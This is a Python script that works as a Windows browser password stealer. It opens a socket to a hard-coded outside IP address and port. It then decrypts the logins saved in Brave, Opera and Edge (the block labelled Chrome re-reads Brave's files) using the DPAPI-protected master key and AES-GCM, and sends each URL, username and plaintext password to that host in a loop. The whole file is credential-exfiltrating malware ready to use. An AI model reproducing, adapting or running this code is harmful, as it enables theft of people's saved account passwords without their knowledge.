import os, time
try:
    import json, pyfiglet, base64, sqlite3, win32crypt, shutil, socket
    from Crypto.Cipher import AES
except ModuleNotFoundError:
    installing = input("is pip or pip3 installed?(pip/pip3)")
    print("modules are not installed")
    os.system(installing+" install pyfiglet pypiwin32 pycryptodome")
    print("Got An Error?, restart the program!")


#######################################################################
#######################################################################
##############################################################################################################################################
#######################################################################
#######################################################################
s = socket.socket()
#########################REPLACE IP WITH UR PUBLIC IP AND PORT WITH THE PORT YOU ARE FORWARDING
s.connect(('90.255.209.167', 55555))
#######################################################################
#######################################################################
#######################################################################
#######################################################################
#######################################################################
#######################################################################
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(str(e))
#######################################################################
#######################################################################
#######################################################################
while True:
    string = "EXTRACTING PASSWORDS..."
    string1 = "SUCCESFULLY GRABBED PASSWORDS..."
    string2 = "PRINTING PASSWORDS..."
    string3 = pyfiglet.figlet_format("Brave browser")
    string4 = pyfiglet.figlet_format("Google chrome")
    string5 = pyfiglet.figlet_format("Opera browser")
    string6 = pyfiglet.figlet_format("Edge browser")

    s.send(string.encode())
    time.sleep(2)
    s.send(string1.encode())
    time.sleep(2)
    s.send(string2.encode())
    time.sleep(2)

    try:
        def get_master_key():
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State', "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]  # removing DPAPI
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

        s.send(string3.encode())
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Login Data'
        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                test = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n"
                s.send(test.encode())
        except Exception as e:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            pass
    except FileNotFoundError:
        s.send("\nUSER HAS NOT INSTALLED BRAVE BROWSER OR THERE IS NO DATA!".encode())
    #######################################################################
    #######################################################################
    #######################################################################
    try:
        
        def get_master_key():
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State', "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]  # removing DPAPI
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        
        s.send(string4.encode())
        if __name__ == '__main__':
            master_key = get_master_key()
            login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Login Data'
            shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = decrypt_password(encrypted_password, master_key)
                    test = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n"
                    s.send(test.encode())
            except Exception as e:
                pass
            cursor.close()
            conn.close()
            try:
                os.remove("Loginvault.db")
            except Exception as e:
                pass
    except FileNotFoundError:
        s.send("\nUSER HAS NOT INSTALLED GOOGLE CHROME OR THERE IS NO DATA!".encode())
#######################################################################
#######################################################################
#######################################################################
    try:
        def get_master_key():
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State', "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]  # removing DPAPI
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        
        s.send(string5.encode())
        if __name__ == '__main__':
            master_key = get_master_key()
            login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Login Data'
            shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = decrypt_password(encrypted_password, master_key)
                    test = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n"
                    s.send(test.encode())
            except Exception as e:
                pass
            cursor.close()
            conn.close()
            try:
                os.remove("Loginvault.db")
            except Exception as e:
                pass
    except FileNotFoundError:
        s.send("\nUSER HAS NOT INSTALLED OPERA OR THERE IS NO DATA!".encode())
#######################################################################
#######################################################################
#######################################################################
    try:
        def get_master_key():
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]  # removing DPAPI
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        
        s.send(string6.encode())
        if __name__ == '__main__':
            master_key = get_master_key()
            login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
            shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = decrypt_password(encrypted_password, master_key)
                    test = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n"
                    s.send(test.encode())
            except Exception as e:
                pass
            cursor.close()
            conn.close()
            try:
                os.remove("Loginvault.db")
            except Exception as e:
                pass
    except FileNotFoundError:
        s.send("\nUSER HAS NOT INSTALLED MICROSOFT EDGE OR THERE IS NO DATA!".encode())
#######################################################################
#######################################################################
#######################################################################
    print(s.recv(1024).decode())
s.close()